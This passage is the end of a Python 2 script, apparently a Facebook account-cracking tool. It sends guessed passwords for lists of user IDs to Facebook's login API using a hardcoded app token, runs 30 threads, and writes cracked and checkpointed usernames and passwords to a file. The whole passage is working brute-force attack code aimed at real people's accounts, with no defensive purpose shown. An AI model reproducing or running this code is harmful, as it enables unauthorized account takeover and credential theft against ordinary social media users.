																			print '\033[1;97m[\033[1;97mCP\033[1;97m] ' +user+ ' | ' + pass8 + ' > ' + b['name']
																			cek = open("out/pchoice.txt", "a")
																			cek.write("[+] Nama     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass8+"\n")
																			cek.close()
																			cekpoint.append(user+pass8)
																		else:
																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																			q = json.load(data)
																			if 'access_token' in q:
																				print '\x1b[1;97m[\033[1;97mOK\033[1;97m] ' +user+ ' | ' + pass9 + ' > ' + b['name']
																				oks.append(user+pass9)
																			else:
																				if 'www.facebook.com' in q["error_msg"]:
																					print '\033[1;97m[\033[1;97mCP\033[1;97m] ' +user+ ' | ' + pass9 + ' > ' + b['name']
																					cek = open("out/pchoice.txt", "a")
																					cek.write("[+] Nama     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass9+"\n")
																					cek.close()
																					cekpoint.append(user+pass9)
																				else:
																					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																					q = json.load(data)
																					if 'access_token' in q:
																						print '\x1b[1;97m[\033[1;97mOK\033[1;97m] ' +user+ ' | ' + pass10 + ' > ' + b['name']
																						oks.append(user+pass10)
																					if 'www.facebook.com' in q["error_msg"]:
																						print '\033[1;97m[\033[1;97mCP\033[1;97m] ' +user+ ' | ' + pass10 + ' > ' + b['name']
																						cek = open("out/pchoice.txt", "a")
																						cek.write("[+] Nama     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass10+"\n")
																						cek.close()
																						cekpoint.append(user+pass10)
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print '\n\033[1;97m[\033[1;97m✓\033[1;97m] Process Has Been Completed ...'
	print '\033[1;97m[\033[1;97m✓\033[1;97m] Total \033[1;97mOK\033[1;97m/\033[1;97mCP\033[1;97m : '+str(len(oks))+'/'+str(len(cekpoint))
	print('\033[1;97m[\033[1;97m✓\033[1;97m] Cracking Accounts Has Been Saved : out/pchoice.txt')
	raw_input("\n\033[1;97mPress Enter Go Back To Menu")
	menu()

if __name__=='__main__':
        menu()
        masuk()
